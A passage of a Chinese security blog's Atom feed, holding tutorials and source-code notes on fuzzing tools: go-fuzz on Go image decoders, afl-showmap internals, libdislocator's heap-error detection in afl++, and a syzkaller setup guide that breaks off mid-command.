&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="ghidra" scheme="https://www.giantbranch.cn/tags/ghidra/"/>
    
      <category term="static-analyzer" scheme="https://www.giantbranch.cn/tags/static-analyzer/"/>
    
  </entry>
  
  <entry>
    <title>使用go-fuzz进行简单的fuzzing实践</title>
    <link href="https://www.giantbranch.cn/2021/11/02/%E4%BD%BF%E7%94%A8go-fuzz%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84fuzzing%E5%AE%9E%E8%B7%B5/"/>
    <id>https://www.giantbranch.cn/2021/11/02/使用go-fuzz进行简单的fuzzing实践/</id>
    <published>2021-11-02T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="go环境配置"><a href="#go环境配置" class="headerlink" title="go环境配置"></a>go环境配置</h1><p>具体参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://golang.org/doc/install</span><br></pre></td></tr></table></figure><p>以我当时为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.17.2.linux-amd64.tar.gz</span><br><span class="line">rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.2.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line"># 下面的最好放到.bashrc里面（我用的Ubuntu）</span><br><span class="line">export PATH=$PATH:/usr/local/go/bin:~/go/bin</span><br></pre></td></tr></table></figure><p>其他注意事项：</p><p>go1.16以后，默认需要提供go.mod，我们可以设置环境变量GO111MODULE为auto让其自动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=auto</span><br></pre></td></tr></table></figure><h1 id="例子实践"><a href="#例子实践" class="headerlink" title="例子实践"></a>例子实践</h1><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat png.go </span><br><span class="line">package png</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;image/png&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func Fuzz(data []byte) int &#123;</span><br><span class="line">png.Decode(bytes.NewReader(data))</span><br><span class="line">return 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在文件目录执行go-fuzz-build，就会生成png-fuzz.zip</p><p>之后直接运行go-fuzz命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ go-fuzz</span><br><span class="line">2021/11/03 09:21:10 workers: 1, corpus: 25 (0s ago), crashers: 0, restarts: 1/0, execs: 0 (0/sec), cover: 0, uptime: 3s</span><br><span class="line">2021/11/03 09:21:13 workers: 1, corpus: 27 (2s ago), crashers: 0, restarts: 1/0, execs: 0 (0/sec), cover: 187, uptime: 6s</span><br><span class="line">2021/11/03 09:21:16 workers: 1, corpus: 27 (5s ago), crashers: 0, restarts: 1/6770, execs: 40621 (4513/sec), cover: 191, uptime: 9s</span><br><span class="line">2021/11/03 09:21:19 workers: 1, corpus: 27 (8s ago), crashers: 0, restarts: 1/8809, execs: 88095 (7341/sec), cover: 191, uptime: 12s</span><br></pre></td></tr></table></figure><p>不过最好指定一下输出路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-fuzz -workdir output</span><br></pre></td></tr></table></figure><p>还有一种是以libfuzzer的支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go-fuzz-build -libfuzzer -o png.a</span><br><span class="line">clang -fsanitize=fuzzer png.a -o png.libfuzzer</span><br></pre></td></tr></table></figure><p>之后把png.libfuzzer运行就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./png.libfuzzer </span><br><span class="line">INFO: Running with entropic power schedule (0xFF, 100).</span><br><span class="line">INFO: Seed: 4139029883</span><br><span class="line">INFO: 65536 Extra Counters</span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#2INITED ft: 27 corp: 1/1b exec/s: 0 rss: 29Mb</span><br><span class="line">#414NEW    ft: 34 corp: 2/9b lim: 8 exec/s: 0 rss: 30Mb L: 8/8 MS: 2 InsertByte-InsertRepeatedBytes-</span><br><span class="line">#262144pulse  ft: 34 corp: 2/9b lim: 2611 exec/s: 87381 rss: 35Mb</span><br><span class="line">#524288pulse  ft: 34 corp: 2/9b lim: 4096 exec/s: 74898 rss: 35Mb</span><br></pre></td></tr></table></figure><p>当然是用corpus会有更好的覆盖率，corpus可以从github.com/dvyukov/go-fuzz-corpus获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ./png.libfuzzer ./go-fuzz-corpus/png/corpus/</span><br><span class="line">INFO: Running with entropic power schedule (0xFF, 100).</span><br><span class="line">INFO: Seed: 4180837821</span><br><span class="line">INFO: 65536 Extra Counters</span><br><span class="line">INFO:      441 files found in ./go-fuzz-corpus/png/corpus/</span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 294915 bytes</span><br><span class="line">INFO: seed corpus: files: 441 min: 1b max: 294915b total: 4508226b rss: 29Mb</span><br><span class="line">#442INITED ft: 3197 corp: 328/2959Kb exec/s: 0 rss: 47Mb</span><br><span class="line">#476REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 0 rss: 47Mb L: 134/294915 MS: 4 ChangeByte-ChangeBit-ShuffleBytes-EraseBytes-</span><br><span class="line">#1957REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 0 rss: 48Mb L: 64/294915 MS: 1 EraseBytes-</span><br><span class="line">#2283REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 0 rss: 49Mb L: 15997/294915 MS: 1 EraseBytes-</span><br><span class="line">#2629REDUCE ft: 3197 corp: 328/2959Kb lim: 294915 exec/s: 2629 rss: 49Mb L: 2182/294915 MS: 1 EraseBytes-</span><br><span class="line">#5131REDUCE ft: 3197 corp: 328/2958Kb lim: 294915 exec/s: 5131 rss: 50Mb L: 329/294915 MS: 2 CrossOver-EraseBytes-</span><br><span class="line">#5372REDUCE ft: 3197 corp: 328/2958Kb lim: 294915 exec/s: 5372 rss: 50Mb L: 48/294915 MS: 1 EraseBytes-</span><br><span class="line">#5388REDUCE ft: 3197 corp: 328/2958Kb lim: 294915 exec/s: 5388 rss: 50Mb L: 93/294915 MS: 1 EraseBytes-</span><br><span class="line">#5464NEW    ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 5464 rss: 50Mb L: 75/294915 MS: 1 CopyPart-</span><br><span class="line">#5695REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 2847 rss: 50Mb L: 31/294915 MS: 1 EraseBytes-</span><br><span class="line">#7537REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 3768 rss: 50Mb L: 92/294915 MS: 2 ChangeBit-EraseBytes-</span><br><span class="line">#7693REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 3846 rss: 50Mb L: 9059/294915 MS: 5 CrossOver-CrossOver-CrossOver-InsertByte-EraseBytes-</span><br><span class="line">#8192pulse  ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 4096 rss: 50Mb</span><br><span class="line">#8239REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 4119 rss: 50Mb L: 110/294915 MS: 1 EraseBytes-</span><br><span class="line">#8491REDUCE ft: 3198 corp: 329/2958Kb lim: 294915 exec/s: 4245 rss: 50Mb L: 114/294915 MS: 2 ChangeASCIIInt-EraseBytes-</span><br><span class="line">#9009REDUCE ft: 3198 corp: 329/2954Kb lim: 294915 exec/s: 4504 rss: 50Mb L: 14101/294915 MS: 3 ChangeASCIIInt-ChangeByte-EraseBytes-</span><br></pre></td></tr></table></figure><p>假如要fuzz gif，改成下面即可，其他图片库类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package gif </span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;image/gif&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func Fuzz(data []byte) int &#123;</span><br><span class="line">gif.Decode(bytes.NewReader(data))</span><br><span class="line">return 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;go环境配置&quot;&gt;&lt;a href=&quot;#go环境配置&quot; class=&quot;headerlink&quot; title=&quot;go环境配置&quot;&gt;&lt;/a&gt;go环境配置&lt;/h1&gt;&lt;p&gt;具体参考&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
      <category term="fuzzing" scheme="https://www.giantbranch.cn/tags/fuzzing/"/>
    
      <category term="go-fuzz" scheme="https://www.giantbranch.cn/tags/go-fuzz/"/>
    
  </entry>
  
  <entry>
    <title>afl源码阅读之afl-showmap</title>
    <link href="https://www.giantbranch.cn/2021/08/27/afl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-showmap/"/>
    <id>https://www.giantbranch.cn/2021/08/27/afl源码阅读之afl-showmap/</id>
    <published>2021-08-27T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.058Z</updated>
    
    <content type="html"><![CDATA[<p>看过afl-fuzz的源码，之后再看afl-showmap，很多代码都是copy过去的</p><h1 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h1><p>首先还是参数解析</p><p>-o：指定afl-showmap输出的文件名<br>-m：内存限制<br>-t：设置超时值<br>-e：就是只获取边，不用获取边的频率<br>-q：安静模式<br>-Z：安静模式，和cmin_mode置1，会影响输出文件的格式<br>-A：指定输入的文件，替代命令行的@@<br>-Q：qemu模式<br>-b：输出的是二进制格式，类似于afl-fuzz输出的out_dir/queue/fuzz_bitmap<br>-c：根据注释是Allow coredumps<br>-V：输出版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// 配置共享内存</span><br><span class="line">setup_shm();</span><br><span class="line">// 设置一些信号的回调函数</span><br><span class="line">setup_signal_handlers();</span><br><span class="line">// 设置环境变量，ASAN_OPTIONS和MSAN_OPTIONS，还有根据AFL_PRELOAD设置LD_PRELOAD和DYLD_INSERT_LIBRARIES</span><br><span class="line">set_up_environment();</span><br><span class="line">// 查找binary，假如是绝对路径，就检测一下文件是否存在，是否可执行，否则就在PATH环境变量下查找binary</span><br><span class="line">find_binary(argv[optind]);</span><br><span class="line">// 非安静模式，输出banner和执行的binary路径</span><br><span class="line">if (!quiet_mode) &#123;</span><br><span class="line">  show_banner();</span><br><span class="line">  ACTF(&quot;Executing &apos;%s&apos;...\n&quot;, target_path);</span><br><span class="line">&#125;</span><br><span class="line">// 假如参数中有@@，会将-A参数的testcase替换@@的位置</span><br><span class="line">detect_file_args(argv + optind);</span><br><span class="line"></span><br><span class="line">if (qemu_mode)</span><br><span class="line">  // 假如是qemu模式，构建qemu的参数，运行的命令替换成`afl-qemu-trace -- target_path`</span><br><span class="line">  use_argv = get_qemu_argv(argv[0], argv + optind, argc - optind);</span><br><span class="line">else</span><br><span class="line">  use_argv = argv + optind;</span><br><span class="line">// fork一个子进程去运行target，之后对trace_bits进行归一化处理（通过setitimer设置超时发出SIGALRM信号，会回调handle_timeout函数，将子进杀掉）</span><br><span class="line">run_target(use_argv);</span><br><span class="line">// 将结果写到-o指定的文件中，假如binary_mode，将trace_bits直接写到文件中，否则就是`fprintf(f, &quot;%06u:%u\n&quot;, i, trace_bits[i]);`写到文件中</span><br><span class="line">tcnt = write_results();</span><br><span class="line"></span><br><span class="line">if (!quiet_mode) &#123;</span><br><span class="line"></span><br><span class="line">  if (!tcnt) FATAL(&quot;No instrumentation detected&quot; cRST);</span><br><span class="line">  OKF(&quot;Captured %u tuples in &apos;%s&apos;.&quot; cRST, tcnt, out_file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 退出</span><br><span class="line">exit(child_crashed * 2 + child_timed_out);</span><br></pre></td></tr></table></figure><h1 id="实际结果"><a href="#实际结果" class="headerlink" title="实际结果"></a>实际结果</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/afl/afl-showmap -o mapfile ./testimage ./test/tests_61412.jpg</span><br><span class="line">$ cat mapfile | more</span><br><span class="line">000000:1</span><br><span class="line">000230:2</span><br><span class="line">000360:4</span><br><span class="line">000473:1</span><br><span class="line">000522:1</span><br><span class="line">000686:1</span><br><span class="line">000755:1</span><br><span class="line">000774:1</span><br><span class="line">001084:8</span><br><span class="line">001188:4</span><br><span class="line">001220:1</span><br><span class="line">001370:1</span><br><span class="line">001571:7</span><br><span class="line">001880:1</span><br><span class="line">001963:1</span><br><span class="line">002199:1</span><br><span class="line">002268:1</span><br><span class="line">002419:2</span><br><span class="line">002449:2</span><br><span class="line">002781:1</span><br><span class="line">003124:2</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看过afl-fuzz的源码，之后再看afl-showmap，很多代码都是copy过去的&lt;/p&gt;
&lt;h1 id=&quot;main函数&quot;&gt;&lt;a href=&quot;#main函数&quot; class=&quot;headerlink&quot; title=&quot;main函数&quot;&gt;&lt;/a&gt;main函数&lt;/h1&gt;&lt;p&gt;首先还
      
    
    </summary>
    
    
      <category term="afl" scheme="https://www.giantbranch.cn/tags/afl/"/>
    
      <category term="afl源码阅读" scheme="https://www.giantbranch.cn/tags/afl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>libdislocator原理及afl++的更新</title>
    <link href="https://www.giantbranch.cn/2021/07/09/libdislocator%E5%8E%9F%E7%90%86%E5%8F%8Aafl++%E7%9A%84%E6%9B%B4%E6%96%B0/"/>
    <id>https://www.giantbranch.cn/2021/07/09/libdislocator原理及afl++的更新/</id>
    <published>2021-07-09T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h1><p>申请内存通过mmap实现，最低申请两个页（默认4096一个页）</p><p>last page通过mprotest设置为PROT_NONE，无法读写执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(ret + PG_COUNT(rlen + 8) * PAGE_SIZE, PAGE_SIZE, PROT_NONE)</span><br></pre></td></tr></table></figure><p>之后将内存指针向右对齐，前面放len和alloc_canry</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret += PAGE_SIZE * PG_COUNT(rlen + 8) - rlen - 8;</span><br><span class="line"></span><br><span class="line">  /* Store allocation metadata. */</span><br><span class="line"></span><br><span class="line">  ret += 8;</span><br><span class="line"></span><br><span class="line">  PTR_L(ret) = len;</span><br><span class="line">  PTR_C(ret) = alloc_canary;</span><br></pre></td></tr></table></figure><p><img src="http://pic.giantbranch.cn/pic/1626079563829.png" alt></p><p>free的时候是将整个内存设置为PROT_NONE</p><p>那么当程序存在堆溢出的时候，就会访问到PROT_NONE内存而出错</p><p>free掉的内存因为PROT_NONE也不可访问，可以检测uaf</p><h1 id="新增特性"><a href="#新增特性" class="headerlink" title="新增特性"></a>新增特性</h1><p>1、增加了对mac和FreeBSD 的兼容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#ifdef __APPLE__</span><br><span class="line">  #include &lt;mach/vm_statistics.h&gt;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#ifdef __FreeBSD__</span><br><span class="line">  #include &lt;sys/param.h&gt;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>2、 不是C11，重新定义max_align_t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#if __STDC_VERSION__ &lt; 201112L || \</span><br><span class="line">    (defined(__FreeBSD__) &amp;&amp; __FreeBSD_version &lt; 1200000)</span><br><span class="line">// use this hack if not C11</span><br><span class="line">typedef struct &#123;</span><br><span class="line"></span><br><span class="line">  long long   __ll;</span><br><span class="line">  long double __ld;</span><br><span class="line"></span><br><span class="line">&#125; max_align_t;</span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>3、增加AFL_RANDOM_ALLOC_CANARY选项</p><p>随机canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((constructor)) void __dislocator_init(void) &#123;</span><br><span class="line"></span><br><span class="line">  char *tmp = getenv(&quot;AFL_LD_LIMIT_MB&quot;);</span><br><span class="line"></span><br><span class="line">  if (tmp) &#123;</span><br><span class="line"></span><br><span class="line">    char *             tok;</span><br><span class="line">    unsigned long long mmem = strtoull(tmp, &amp;tok, 10);</span><br><span class="line">    if (*tok != &apos;\0&apos; || errno == ERANGE || mmem &gt; SIZE_MAX / 1024 / 1024)</span><br><span class="line">      FATAL(&quot;Bad value for AFL_LD_LIMIT_MB&quot;);</span><br><span class="line">    max_mem = mmem * 1024 * 1024;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  alloc_canary = ALLOC_CANARY;</span><br><span class="line">  tmp = getenv(&quot;AFL_RANDOM_ALLOC_CANARY&quot;);</span><br><span class="line"></span><br><span class="line">  if (tmp) arc4random_buf(&amp;alloc_canary, sizeof(alloc_canary));</span><br><span class="line"></span><br><span class="line">  alloc_verbose = !!getenv(&quot;AFL_LD_VERBOSE&quot;);</span><br><span class="line">  hard_fail = !!getenv(&quot;AFL_LD_HARD_FAIL&quot;);</span><br><span class="line">  no_calloc_over = !!getenv(&quot;AFL_LD_NO_CALLOC_OVER&quot;);</span><br><span class="line">  align_allocations = !!getenv(&quot;AFL_ALIGNED_ALLOC&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、新增emalloc、ecalloc、erealloc</p><p>5、增加TAIL_ALLOC_CANARY（强制对齐的时候）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> size_t rlen;</span><br><span class="line"> if (align_allocations &amp;&amp; (len &amp; (ALLOC_ALIGN_SIZE - 1)))</span><br><span class="line">   rlen = (len &amp; ~(ALLOC_ALIGN_SIZE - 1)) + ALLOC_ALIGN_SIZE;</span><br><span class="line"> else</span><br><span class="line">   rlen = len;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">if (rlen != len) &#123;</span><br><span class="line"></span><br><span class="line">   size_t i;</span><br><span class="line">   for (i = len; i &lt; rlen; ++i)</span><br><span class="line">     ret[i] = TAIL_ALLOC_CANARY;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>需要开启<code>AFL_ALIGNED_ALLOC</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">align_allocations = !!getenv(&quot;AFL_ALIGNED_ALLOC&quot;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;检测原理&quot;&gt;&lt;a href=&quot;#检测原理&quot; class=&quot;headerlink&quot; title=&quot;检测原理&quot;&gt;&lt;/a&gt;检测原理&lt;/h1&gt;&lt;p&gt;申请内存通过mmap实现，最低申请两个页（默认4096一个页）&lt;/p&gt;
&lt;p&gt;last page通过mprotest设置为P
      
    
    </summary>
    
    
      <category term="afl++" scheme="https://www.giantbranch.cn/tags/afl/"/>
    
      <category term="libdislocator" scheme="https://www.giantbranch.cn/tags/libdislocator/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller的安装与运行</title>
    <link href="https://www.giantbranch.cn/2021/06/25/syzkaller%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E8%BF%90%E8%A1%8C/"/>
    <id>https://www.giantbranch.cn/2021/06/25/syzkaller的安装与运行/</id>
    <published>2021-06-25T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.130Z</updated>
    
    <content type="html"><![CDATA[<p>syzkaller是一种无监督的覆盖引导内核模糊器。</p><p>支持的操作系统：Akaros, FreeBSD, Fuchsia, gVisor, Linux, NetBSD, OpenBSD, Windows.</p><p>对linux的支持最全面</p><h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p><img src="http://pic.giantbranch.cn/pic/1626165608414.png" alt></p><p><strong>syz-manager</strong><br>1、启动、监控多个vm实例<br>2、复制syz-fuzzer到vm里面，并启动它<br>3、存储corpus和crashes<br><strong>syz-fuzzer</strong><br>1、fuzzing（输入生成、变异、最小化等）<br>2、通过RPC发送触发新路径的input给到syz-manager<br>3、启动syz-executor<br><strong>syz-executor</strong><br> 执行每个input（就是系统调用的序列）<br> 用C++编写，静态二进制，使用共享内存进行通信</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>依赖安装</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install </span><span class="keyword">build-essential </span>flex <span class="keyword">bison </span>libssl-dev libelf-dev <span class="keyword">bc</span></span><br></pre></td></tr></table></figure><p>下载源码编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git kernel</span><br><span class="line"></span><br><span class="line">cd kernel</span><br><span class="line"># 生成默认配置</span><br><span class="line"></span><br><span class="line">make defconfig</span><br><span class="line">make kvm_guest.config</span><br></pre></td></tr></table></figure><p>在.config文件中加入以下配置<br>vim .config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Coverage collection.</span><br><span class="line">CONFIG_KCOV=y</span><br><span class="line"></span><br><span class="line"># Debug info for symbolization.</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line"></span><br><span class="line"># Memory bug detector</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"></span><br><span class="line"># Required for Debian Stretch</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 由于启用这些选项会导致更多子选项可用，我们需要重新生成配置</span><br><span class="line">make olddefconfig</span><br><span class="line"></span><br><span class="line">make -j 16</span><br></pre></td></tr></table></figure><p>创建镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install debootstrap</span><br><span class="line"></span><br><span class="line">cd $IMAGE/</span><br><span class="line">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure><p>安装qemu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install qemu-system-x86</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 2G \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel ./kernel/arch/x86/boot/bzImage \</span><br><span class="line">-append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \</span><br><span class="line">-drive file=./image/stretch.img,format=raw \</span><br><span class="line">-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">-net 